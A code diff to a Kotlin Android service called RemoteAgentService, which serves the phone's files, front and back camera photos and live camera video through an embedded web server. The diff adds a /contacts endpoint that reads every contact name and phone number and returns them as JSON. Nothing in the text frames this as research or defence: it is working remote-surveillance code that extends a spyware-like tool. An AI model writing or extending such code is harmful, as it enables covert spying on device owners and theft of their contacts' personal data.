@@ -26,6 +26,8 @@ import android.os.Handler
 import android.os.HandlerThread
 import android.content.pm.PackageManager
 import android.graphics.ImageFormat
+import android.provider.ContactsContract
+import com.google.gson.Gson
 import java.io.PipedInputStream
 import java.io.PipedOutputStream
 
@@ -52,6 +54,7 @@ class RemoteAgentService : Service() {
                     session.uri == "/capture/back" -> captureCameraImage(CameraCharacteristics.LENS_FACING_BACK)
                     session.uri == "/video/front" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_FRONT)
                     session.uri == "/video/back" -> streamCameraVideo(CameraCharacteristics.LENS_FACING_BACK)
+                    session.uri == "/contacts" -> getContacts()
                     session.uri == "/status" -> newFixedLengthResponse("OK: ${System.currentTimeMillis()}")
                     else -> newFixedLengthResponse(
                         Response.Status.OK,
@@ -60,6 +63,7 @@ class RemoteAgentService : Service() {
                         <h3>Remote Agent Active</h3>
                         <ul>
                             <li><a href='/files'>📁 Browse Files</a></li>
+                            <li><a href='/contacts'>📸 Contacts</a></li>
                             <li><a href='/capture/front'>🤳 Front Camera</a></li>
                             <li><a href='/capture/back'>📸 Back Camera</a></li>
                              <li><a href='/video/front'>🤳 Front Video Camera</a></li>
@@ -299,6 +303,46 @@ class RemoteAgentService : Service() {
             pipeInput
         )
     }
+
+    private fun getContacts(): NanoHTTPD.Response {
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS)
+            != PackageManager.PERMISSION_GRANTED
+        ) {
+            return NanoHTTPD.newFixedLengthResponse(
+                NanoHTTPD.Response.Status.FORBIDDEN,
+                "text/plain",
+                "Contacts permission not granted"
+            )
+        }
+
+        val contactsList = mutableListOf<Map<String, String>>()
+        val cursor = contentResolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            arrayOf(
+                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                ContactsContract.CommonDataKinds.Phone.NUMBER
+            ),
+            null,
+            null,
+            null
+        )
+
+        cursor?.use {
+            while (it.moveToNext()) {
+                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
+                val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                contactsList.add(mapOf("name" to name, "number" to number))
+            }
+        }
+
+        val json = Gson().toJson(contactsList)
+        return NanoHTTPD.newFixedLengthResponse(
+            NanoHTTPD.Response.Status.OK,
+            "application/json",
+            json
+        )
+    }
+
 
 
 
